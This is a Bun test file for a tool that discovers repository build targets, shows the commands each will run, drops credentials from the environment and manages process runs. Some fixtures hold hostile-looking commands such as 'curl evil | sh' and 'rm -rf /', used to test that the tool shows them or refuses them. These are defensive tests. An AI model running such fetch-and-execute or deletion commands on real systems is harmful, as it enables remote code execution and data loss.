import { afterAll, beforeAll, describe, expect, it } from "bun:test";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import {
	commandLine,
	createRunManager,
	type DiscoverDeps,
	discoverTargets,
	OutputRing,
	parseJustDump,
	checkRunnableRoot,
	MAX_RUNS_TOTAL,
	parseMakefile,
	type RunManager,
	type RunSpec,
	runEnv,
} from "../scripts/companion-run";
import type { RunInfo } from "../src/lib/companion";

let tmp: string;
let seq = 0;

beforeAll(async () => {
	tmp = await fs.mkdtemp(path.join(os.tmpdir(), "companion-run-"));
});

afterAll(async () => {
	await fs.rm(tmp, { recursive: true, force: true });
});

/** A fresh repository directory holding `files`. */
async function repo(files: Record<string, string>): Promise<string> {
	const dir = path.join(tmp, `repo-${++seq}`);
	await fs.mkdir(dir, { recursive: true });
	for (const [name, content] of Object.entries(files)) await Bun.write(path.join(dir, name), content);
	return dir;
}

const noJust: DiscoverDeps = { which: () => null };

async function ids(dir: string, deps: DiscoverDeps = noJust): Promise<string[]> {
	return (await discoverTargets(dir, deps)).map(t => t.id);
}

describe("package.json targets", () => {
	const scripts = JSON.stringify({ scripts: { test: "x", build: "y", "lint:fix": "z" } });

	it("runs scripts with the package manager the lockfile names", async () => {
		const cases: Array<[string, string]> = [
			["bun.lock", "bun run"],
			["bun.lockb", "bun run"],
			["pnpm-lock.yaml", "pnpm run"],
			["yarn.lock", "yarn run"],
			["package-lock.json", "npm run"],
		];
		for (const [lock, prefix] of cases) {
			const dir = await repo({ "package.json": scripts, [lock]: "" });
			const targets = await discoverTargets(dir, noJust);
			expect(targets.map(t => t.command)).toEqual([`${prefix} test`, `${prefix} build`, `${prefix} lint:fix`]);
			expect(targets[2].argv).toEqual([prefix.split(" ")[0], "run", "lint:fix"]);
		}
	});

	it("falls back to the packageManager field, then npm", async () => {
		const withField = await repo({
			"package.json": JSON.stringify({ packageManager: "pnpm@9.1.0", scripts: { a: "x" } }),
		});
		expect((await discoverTargets(withField, noJust))[0].command).toBe("pnpm run a");
		const bare = await repo({ "package.json": JSON.stringify({ scripts: { a: "x" } }) });
		expect((await discoverTargets(bare, noJust))[0].command).toBe("npm run a");
	});

	it("lists no script that would read as a flag or that the package manager runs by itself", async () => {
		const dir = await repo({
			"package.json": JSON.stringify({
				scripts: {
					test: "a",
					pretest: "b",
					posttest: "c",
					prebuild: "d",
					"--dangerous": "e",
					"has space": "f",
					prepare: "g",
					postinstall: "h",
					prettier: "i",
				},
			}),
		});
		// `prebuild` has no `build` to wrap, and `prettier` merely starts with "pre".
		expect(await ids(dir)).toEqual(["package:test", "package:prebuild", "package:prettier"]);
	});

	it("tolerates a package.json that is not valid or has no scripts", async () => {
		expect(await ids(await repo({ "package.json": "{nope" }))).toEqual([]);
		expect(await ids(await repo({ "package.json": "{}" }))).toEqual([]);
		expect(await ids(await repo({ "package.json": JSON.stringify({ scripts: ["a"] }) }))).toEqual([]);
	});
});

describe("what a target executes (shown before it runs)", () => {
	it("shows a package script with the pre and post hooks the package manager adds", async () => {
		const dir = await repo({
			"package.json": JSON.stringify({
				scripts: { test: "bun test", pretest: "curl evil | sh", posttest: "echo done" },
			}),
		});
		const [target] = await discoverTargets(dir, noJust);
		expect(target.detail).toBe("pretest: curl evil | sh\ntest: bun test\nposttest: echo done");
	});

	it("shows the rule line and recipe lines of a Makefile target, and cuts a long recipe", async () => {
		const long = Array.from({ length: 30 }, (_, i) => `\techo step ${i}`).join("\n");
		const dir = await repo({
			Makefile: `deploy: build\n\trm -rf /tmp/x\n\n\tcurl a | sh\nother:\n\ttrue\nlong:\n${long}\n`,
		});
		const targets = await discoverTargets(dir, noJust);
		expect(targets.find(t => t.name === "deploy")?.detail).toBe("deploy: build\n\trm -rf /tmp/x\n\tcurl a | sh");
		const detail = targets.find(t => t.name === "long")?.detail ?? "";
		expect(detail.split("\n")).toHaveLength(21);
		expect(detail.endsWith("… 11 more lines")).toBe(true);
	});

	it("has nothing to show for Cargo, whose commands are fixed", async () => {
		const [target] = await discoverTargets(await repo({ "Cargo.toml": "" }), noJust);
		expect(target.detail).toBeUndefined();
	});
});

describe("checkRunnableRoot", () => {
	const same = async (cwd: string): Promise<string> => cwd;

	it("refuses a repository a sandboxed session works in, whoever asks", async () => {
		const sessions = [{ cwd: "/work/app", sandboxed: true }, { cwd: "/work/other" }];
		await expect(checkRunnableRoot("/work/app", sessions, same)).rejects.toThrow("sandboxed session");
		await expect(checkRunnableRoot("/work/other", sessions, same)).resolves.toBeUndefined();
	});

	it("refuses a repository beneath the folder a sandboxed session is confined to, not a sibling", async () => {
		const sessions = [{ cwd: "/work", sandboxed: true }];
		await expect(checkRunnableRoot("/work/app", sessions, same)).rejects.toThrow("sandboxed session");
		await expect(checkRunnableRoot("/workshop/app", sessions, same)).resolves.toBeUndefined();
	});

	it("compares resolved repository roots, so a subfolder of the same repository counts", async () => {
		const rootOf = async (cwd: string): Promise<string> => cwd.split("/src")[0];
		const sessions = [{ cwd: "/work/app/src/deep", sandboxed: true }];
		await expect(checkRunnableRoot("/work/app", sessions, rootOf)).rejects.toThrow("sandboxed session");
	});
});

describe("Makefile targets", () => {
	it("lists plain targets, several per rule, and skips assignments, patterns, dot-targets and recipes", () => {
		const text = [
			".PHONY: all test",
			"CC := gcc",
			"FLAGS = -O2 -Wall",
			"all: build test",
			"\tcc main.c",
			"build test:",
			"\t@echo hi",
			"%.o: %.c",
			"dist/app.js: src/app.ts",
			"clean::",
			"deploy-prod : build # trailing",
			"test: again",
		].join("\n");
		expect(parseMakefile(text).map(t => t.name)).toEqual(["all", "build", "test", "deploy-prod"]);
	});

	it("runs a target as `make <name>`", async () => {
		const dir = await repo({ Makefile: "lint:\n\techo ok\n" });
		const [target] = await discoverTargets(dir, noJust);
		expect(target).toMatchObject({ id: "make:lint", source: "make", command: "make lint", argv: ["make", "lint"] });
	});
});

describe("justfile targets", () => {
	const dump = JSON.stringify({
		recipes: {
			dev: { parameters: [] },
			deploy: { parameters: [{ kind: "singular", default: null }] },
			greet: { parameters: [{ kind: "singular", default: "world" }] },
			rest: { parameters: [{ kind: "star", default: null }] },
			hidden: { private: true, parameters: [] },
			_helper: { parameters: [] },
		},
	});

	it("keeps recipes that start without arguments", () => {
		expect(parseJustDump(dump)).toEqual(["dev", "greet", "rest"]);
		expect(parseJustDump("not json")).toEqual([]);
	});

	it("lists recipes only when just is installed and the repository has a justfile", async () => {
		const dir = await repo({ justfile: "dev:\n\techo\n" });
		const deps = {
			which: () => "/usr/bin/just",
			justDump: async () => dump,
			justShow: async (_r: string, _j: string, name: string) => `${name}:\n    echo ${name}`,
		};
		expect(await ids(dir, deps)).toEqual(["just:dev", "just:greet", "just:rest"]);
		expect((await discoverTargets(dir, deps))[0].detail).toBe("dev:\n    echo dev");
		expect(await ids(dir, noJust)).toEqual([]);
		expect(await ids(await repo({}), deps)).toEqual([]);
	});
});

describe("Cargo targets", () => {
	it("offers test and build when Cargo.toml exists", async () => {
		const targets = await discoverTargets(await repo({ "Cargo.toml": "[package]\n" }), noJust);
		expect(targets.map(t => t.command)).toEqual(["cargo test", "cargo build"]);
	});

	it("groups targets by source in a fixed order", async () => {
		const dir = await repo({
			"Cargo.toml": "",
			Makefile: "m:\n",
			"package.json": JSON.stringify({ scripts: { p: "x" } }),
		});
		expect(await ids(dir)).toEqual(["package:p", "make:m", "cargo:test", "cargo:build"]);
	});
});

describe("commandLine", () => {
	it("leaves plain words alone and quotes the rest so the line can be pasted into a shell", () => {
		expect(commandLine(["bun", "run", "lint:fix"])).toBe("bun run lint:fix");
		expect(commandLine(["echo", "a b", "it's"])).toBe("echo 'a b' 'it'\\''s'");
	});
});

describe("OutputRing", () => {
	it("hands out each character once to a reader that follows `next`", () => {
		const ring = new OutputRing(100);
		ring.push("hello ");
		const first = ring.read(0);
		expect(first).toEqual({ text: "hello ", from: 0, next: 6, truncated: false });
		ring.push("world");
		expect(ring.read(first.next)).toEqual({ text: "world", from: 6, next: 11, truncated: false });
		expect(ring.read(11).text).toBe("");
	});

	it("keeps only the newest characters and flags a reader that fell behind", () => {
		const ring = new OutputRing(10);
		ring.push("0123456789");
		ring.push("abcde");
		expect(ring.start).toBe(5);
		expect(ring.end).toBe(15);
		expect(ring.read(0)).toEqual({ text: "56789abcde", from: 5, next: 15, truncated: true });
		expect(ring.read(8)).toEqual({ text: "89abcde", from: 8, next: 15, truncated: false });
	});

	it("trims inside one oversized chunk", () => {
		const ring = new OutputRing(4);
		ring.push("abcdefgh");
		expect(ring.read(0).text).toBe("efgh");
	});

	it("caps one read and continues exactly where it stopped", () => {
		const ring = new OutputRing(100);
		ring.push("abcdef");
		ring.push("ghij");
		const a = ring.read(0, 4);
		expect(a).toMatchObject({ text: "abcd", next: 4 });
		const b = ring.read(a.next, 4);
		expect(b).toMatchObject({ text: "efgh", next: 8 });
		expect(ring.read(b.next, 4)).toMatchObject({ text: "ij", next: 10 });
	});

	it("never splits a surrogate pair between reads or at the trimmed front", () => {
		const ring = new OutputRing(100);
		ring.push("ab😀cd");
		const a = ring.read(0, 3);
		expect(a.text).toBe("ab");
		expect(ring.read(a.next, 3).text).toBe("😀c");
		const small = new OutputRing(2);
		small.push("a😀b");
		expect(small.read(0).text).toBe("b");
	});
});

describe("runEnv", () => {
	it("drops credentials and NO_COLOR, forces color, keeps the rest", () => {
		const env = runEnv({
			PATH: "/bin",
			HOME: "/home/me",
			GH_TOKEN: "t",
			NPM_TOKEN: "t",
			AWS_SECRET_ACCESS_KEY: "s",
			DB_PASSWORD: "p",
			OPENAI_API_KEY: "k",
			SSH_AUTH_SOCK: "/tmp/agent",
			NO_COLOR: "1",
			NPM_AUTH: "a",
			AZURE_DEVOPS_PAT: "p",
			SENTRY_DSN: "d",
			DATABASE_URL: "postgres://u:p@h/db",
			NPM_CONFIG__AUTH: "x",
			PATH_PATTERN: "kept",
		});
		expect(env).toEqual({
			PATH: "/bin",
			HOME: "/home/me",
			SSH_AUTH_SOCK: "/tmp/agent",
			PATH_PATTERN: "kept",
			FORCE_COLOR: "1",
			CLICOLOR_FORCE: "1",
			GIT_TERMINAL_PROMPT: "0",
		});
	});
});

// ── runs, with real short-lived processes ───────────────────────────────────

/** Real child processes end on their own schedule: poll for the condition (no fixed waits) with a deadline. */
async function until<T>(read: () => T | undefined | false, ms = 5_000): Promise<T> {
	const deadline = Date.now() + ms;
	for (;;) {
		const value = read();
		if (value) return value;
		if (Date.now() > deadline) throw new Error("timed out");
		await Bun.sleep(10);
	}
}

function alive(pid: number): boolean {
	try {
		process.kill(pid, 0);
		return true;
	} catch {
		return false;
	}
}

/** A manager whose only target `fake` runs `sh script`; returns the run once it has finished. */
async function runScript(manager: RunManager, dir: string): Promise<RunInfo> {
	const run = await manager.start("inst", dir, "fake:t");
	return until(() => {
		const info = manager.output(run.runId, 0).run;
		return info.state !== "running" && info;
	});
}

function managerFor(script: string, options: Parameters<typeof createRunManager>[0] = {}): RunManager {
	const spec: RunSpec = { id: "fake:t", source: "package", name: "t", command: "sh fake", argv: ["sh", "-c", script] };
	return createRunManager({ discover: async () => [spec], env: { PATH: process.env.PATH, KEEP: "yes" }, ...options });
}

describe("runs", () => {
	it("runs in the repository root, captures stdout and stderr, and reports the exit code and duration", async () => {
		const dir = await repo({});
		const manager = managerFor('pwd; echo out; echo err >&2; printf "%s|%s" "$KEEP" "${GH_TOKEN-unset}"; exit 3', {
			env: { PATH: process.env.PATH, KEEP: "yes" },
		});
		const info = await runScript(manager, dir);
		expect(info).toMatchObject({
			state: "exited",
			exitCode: 3,
			signal: null,
			command: "sh fake",
			instanceId: "inst",
		});
		expect(info.endedAt).toBeGreaterThanOrEqual(info.startedAt);
		const text = manager.output(info.runId, 0).text;
		expect(text).toContain(await fs.realpath(dir));
		expect(text).toContain("out\n");
		expect(text).toContain("err\n");
		expect(text).toContain("yes|unset");
	});

	it("refuses anything that is not a listed target", async () => {
		const manager = managerFor("true");
		await expect(manager.start("inst", tmp, "rm -rf /")).rejects.toThrow("not runnable");
		await expect(manager.start("inst", tmp, 5)).rejects.toThrow("invalid target");
		expect(() => manager.output("nope", 0)).toThrow("unknown run");
		expect(() => manager.output("nope", -1)).toThrow();
	});

	it("starts a target only with the detail the person confirmed", async () => {
		let body = "echo safe";
		const spec = (): RunSpec => ({
			id: "fake:t",
			source: "package",
			name: "t",
			command: "sh fake",
			detail: body,
			argv: ["sh", "-c", "true"],
		});
		const manager = createRunManager({ discover: async () => [spec()] });
		const [target] = await manager.targets(tmp);
		body = "curl evil | sh";
		await expect(manager.start("inst", tmp, target.id, target.detail)).rejects.toThrow(
			"changed since you opened Run",
		);
		await expect(manager.start("inst", tmp, target.id, undefined)).rejects.toThrow("changed since you opened Run");
		body = "echo safe";
		expect((await manager.start("inst", tmp, target.id, target.detail)).state).toBe("running");
	});

	it("refuses a detail for a target that has none", async () => {
		const manager = managerFor("true");
		await expect(manager.start("inst", tmp, "fake:t", "echo hi")).rejects.toThrow("changed since you opened Run");
		await expect(manager.start("inst", tmp, "fake:t", 5)).rejects.toThrow("invalid target");
	});

	it("reports a command that cannot start as failed, with the reason in its output", async () => {
		const spec: RunSpec = {
			id: "fake:t",
			source: "package",
			name: "t",
			command: "nonexistent-bin",
			argv: ["/no/such/bin"],
		};
		const manager = createRunManager({ discover: async () => [spec] });
		const run = await manager.start("inst", tmp, "fake:t");
		expect(run.state).toBe("failed");
		expect(manager.output(run.runId, 0).text).toContain("nonexistent-bin");
	});

	it("allows three runs at once per computer and frees a slot when one ends", async () => {
		const manager = managerFor("sleep 30", { graceMs: 50 });
		const started = [
			await manager.start("a", tmp, "fake:t"),
			await manager.start("b", tmp, "fake:t"),
			await manager.start("a", tmp, "fake:t"),
		];
		await expect(manager.start("c", tmp, "fake:t")).rejects.toThrow("3 runs are already going");
		manager.stop(started[0].runId);
		await until(() => manager.list("a").some(r => r.runId === started[0].runId && r.state === "stopped"));
		const fourth = await manager.start("c", tmp, "fake:t");
		expect(fourth.state).toBe("running");
		for (const run of [started[1], started[2], fourth]) manager.stop(run.runId);
		await until(() => ["a", "b", "c"].every(i => manager.list(i).every(r => r.state !== "running")));
	});

	it("keeps each session's newest ten runs", async () => {
		const manager = managerFor("true");
		const runIds: string[] = [];
		for (let i = 0; i < 12; i++) {
			const info = await runScript(manager, tmp);
			runIds.push(info.runId);
		}
		const kept = manager.list("inst");
		expect(kept).toHaveLength(10);
		expect(kept.map(r => r.runId).sort()).toEqual(runIds.slice(2).sort());
		expect(() => manager.output(runIds[0], 0)).toThrow("unknown run");
	});

	it("lets a script that handles SIGTERM end on its own, without SIGKILL", async () => {
		const manager = managerFor("trap 'echo bye; exit 0' TERM; echo ready; while true; do sleep 0.05; done", {
			graceMs: 10_000,
		});
		const run = await manager.start("inst", tmp, "fake:t");
		await until(() => manager.output(run.runId, 0).text.includes("ready"));
		const stopping = manager.stop(run.runId);
		expect(stopping.state).toBe("running");
		const info = await until(() => {
			const current = manager.output(run.runId, 0).run;
			return current.state !== "running" && current;
		});
		expect(info).toMatchObject({ state: "stopped", exitCode: 0 });
		expect(manager.output(run.runId, 0).text).toContain("bye");
	});

	it("kills the whole process group with SIGKILL when SIGTERM is ignored", async () => {
		const dir = await repo({});
		const pidFile = path.join(dir, "child.pid");
		// The leader and its background child both ignore SIGTERM; only SIGKILL to the group ends them.
		const manager = managerFor(
			`trap '' TERM; sleep 60 & echo $! > ${pidFile}; echo ready; while true; do sleep 0.05; done`,
			{ graceMs: 200 },
		);
		const run = await manager.start("inst", dir, "fake:t");
		await until(() => manager.output(run.runId, 0).text.includes("ready"));
		const childPid = Number((await Bun.file(pidFile).text()).trim());
		expect(alive(childPid)).toBe(true);
		const began = Date.now();
		manager.stop(run.runId);
		const info = await until(() => {
			const current = manager.output(run.runId, 0).run;
			return current.state !== "running" && current;
		});
		expect(Date.now() - began).toBeGreaterThanOrEqual(150);
		expect(info).toMatchObject({ state: "stopped", exitCode: null, signal: "SIGKILL" });
		await until(() => !alive(childPid));
	});

	it("keeps a run going while a process it left behind lives, and Stop reaches that process after the leader exited", async () => {
		const dir = await repo({});
		const pidFile = path.join(dir, "bg.pid");
		const manager = managerFor(`sleep 60 & echo $! > ${pidFile}; echo leader-done`, {
			graceMs: 5_000,
			groupPollMs: 20,
		});
		const run = await manager.start("inst", dir, "fake:t");
		await until(() => manager.output(run.runId, 0).text.includes("leader-done"));
		const bgPid = Number((await Bun.file(pidFile).text()).trim());
		// The leader is gone; the group is not, so the run still counts and still holds a slot.
		expect(manager.output(run.runId, 0).run.state).toBe("running");
		expect(alive(bgPid)).toBe(true);
		manager.stop(run.runId);
		const info = await until(() => {
			const current = manager.output(run.runId, 0).run;
			return current.state !== "running" && current;
		});
		expect(info.state).toBe("stopped");
		await until(() => !alive(bgPid));
	});

	it("stopAll signals groups whose leader already exited", async () => {
		const dir = await repo({});
		const pidFile = path.join(dir, "bg.pid");
		const manager = managerFor(`sleep 60 & echo $! > ${pidFile}; echo leader-done`, { groupPollMs: 20 });
		const run = await manager.start("inst", dir, "fake:t");
		await until(() => manager.output(run.runId, 0).text.includes("leader-done"));
		const bgPid = Number((await Bun.file(pidFile).text()).trim());
		manager.stopAll();
		await until(() => !alive(bgPid));
		await until(() => manager.output(run.runId, 0).run.state !== "running");
	});

	it("holds at most thirty runs on the computer, evicting the oldest finished", async () => {
		const manager = managerFor("true");
		const runIds: string[] = [];
		for (let i = 0; i < MAX_RUNS_TOTAL + 5; i++) {
			// A session per run: the per-session cap alone would keep them all.
			const run = await manager.start(`s${i}`, tmp, "fake:t");
			runIds.push(run.runId);
			await until(() => manager.output(run.runId, 0).run.state !== "running");
		}
		const kept = Array.from({ length: MAX_RUNS_TOTAL + 5 }, (_, i) => manager.list(`s${i}`).length);
		expect(kept.reduce((a, b) => a + b, 0)).toBe(MAX_RUNS_TOTAL);
		expect(() => manager.output(runIds[0], 0)).toThrow("unknown run");
		expect(manager.output(runIds[runIds.length - 1], 0).run.state).toBe("exited");
	});

	it("forgets finished runs of sessions that are no longer listed, never a running one", async () => {
		const manager = managerFor("true");
		const gone = await runScript(manager, tmp);
		const slow = managerFor("sleep 30", { graceMs: 50 });
		const live = await slow.start("inst", tmp, "fake:t");
		manager.retain(new Set(["other"]));
		expect(() => manager.output(gone.runId, 0)).toThrow("unknown run");
		slow.retain(new Set(["other"]));
		expect(slow.output(live.runId, 0).run.state).toBe("running");
		slow.stop(live.runId);
		await until(() => slow.output(live.runId, 0).run.state !== "running");
	});

	it("ignores a second stop and a stop of a finished run", async () => {
		const manager = managerFor("true");
		const info = await runScript(manager, tmp);
		expect(manager.stop(info.runId)).toMatchObject({ state: "exited", exitCode: 0 });
	});

	describe("finished", () => {
		it("resolves with the final record once the run has exited, and its output stays readable", async () => {
			const manager = managerFor("echo first; echo second >&2; exit 4");
			const started = await manager.start("inst", tmp, "fake:t");
			expect(started.state).toBe("running");
			const info = await manager.finished(started.runId);
			expect(info).toMatchObject({
				runId: started.runId,
				state: "exited",
				exitCode: 4,
				signal: null,
				instanceId: "inst",
				command: "sh fake",
			});
			expect(info.endedAt).not.toBeNull();
			expect(info.endedAt).toBeGreaterThanOrEqual(info.startedAt);
			// The record is the same one the output read reports; the output itself is not part of it.
			expect(manager.output(info.runId, 0).run).toEqual(info);
			expect(Object.keys(info)).not.toContain("text");
			const text = manager.output(info.runId, 0).text;
			expect(text).toContain("first\n");
			expect(text).toContain("second\n");
		});

		it("resolves immediately for a run that already finished, with the same record", async () => {
			const manager = managerFor("echo done");
			const info = await runScript(manager, tmp);
			expect(await manager.finished(info.runId)).toEqual(info);
			expect(await manager.finished(info.runId)).toEqual(info);
			expect(await manager.finished(info.runId)).toBe(await manager.finished(info.runId));
		});

		it("rejects for a run it does not know, whatever the id looks like", async () => {
			const manager = managerFor("true");
			await expect(manager.finished("nope")).rejects.toThrow("unknown run");
			await expect(manager.finished(undefined)).rejects.toThrow("unknown run");
			await expect(manager.finished(5)).rejects.toThrow("unknown run");
		});

		it("rejects for a run that was forgotten after it finished", async () => {
			const manager = managerFor("true");
			const info = await runScript(manager, tmp);
			manager.retain(new Set(["other"]));
			await expect(manager.finished(info.runId)).rejects.toThrow("unknown run");
		});

		it("stays pending while the run goes and settles as stopped after Stop", async () => {
			const manager = managerFor("echo ready; sleep 30", { graceMs: 50 });
			const run = await manager.start("inst", tmp, "fake:t");
			let settled = false;
			const waiting = manager.finished(run.runId).then(info => {
				settled = true;
				return info;
			});
			await until(() => manager.output(run.runId, 0).text.includes("ready"));
			expect(settled).toBe(false);
			manager.stop(run.runId);
			const info = await waiting;
			expect(info.state).toBe("stopped");
			expect(info.exitCode).toBeNull();
			expect(info.signal).not.toBeNull();
			expect(manager.output(run.runId, 0).text).toContain("ready");
		});

		it("settles as stopped with SIGKILL when the group ignores SIGTERM", async () => {
			const manager = managerFor("trap '' TERM; echo ready; while true; do sleep 0.05; done", { graceMs: 100 });
			const run = await manager.start("inst", tmp, "fake:t");
			await until(() => manager.output(run.runId, 0).text.includes("ready"));
			manager.stop(run.runId);
			expect(await manager.finished(run.runId)).toMatchObject({
				state: "stopped",
				exitCode: null,
				signal: "SIGKILL",
			});
		});

		it("resolves for a command that could not start, as failed, with the reason in the output", async () => {
			const spec: RunSpec = {
				id: "fake:t",
				source: "package",
				name: "t",
				command: "nonexistent-bin",
				argv: ["/no/such/bin"],
			};
			const manager = createRunManager({ discover: async () => [spec] });
			const run = await manager.start("inst", tmp, "fake:t");
			const info = await manager.finished(run.runId);
			expect(info).toMatchObject({ state: "failed", exitCode: null, signal: null });
			expect(info.endedAt).not.toBeNull();
			expect(manager.output(run.runId, 0).text).toContain("nonexistent-bin");
		});

		it("waits for a process the script left behind before it resolves", async () => {
			const dir = await repo({});
			const pidFile = path.join(dir, "bg.pid");
			const manager = managerFor(`sleep 60 & echo $! > ${pidFile}; echo leader-done`, {
				graceMs: 5_000,
				groupPollMs: 20,
			});
			const run = await manager.start("inst", dir, "fake:t");
			await until(() => manager.output(run.runId, 0).text.includes("leader-done"));
			let settled = false;
			const waiting = manager.finished(run.runId).then(info => {
				settled = true;
				return info;
			});
			// The leader has exited; the group has not, so the run is still going and `finished` has not settled.
			expect(manager.output(run.runId, 0).run.state).toBe("running");
			await Promise.resolve();
			expect(settled).toBe(false);
			const bgPid = Number((await Bun.file(pidFile).text()).trim());
			manager.stop(run.runId);
			expect((await waiting).state).toBe("stopped");
			await until(() => !alive(bgPid));
		});
	});
});
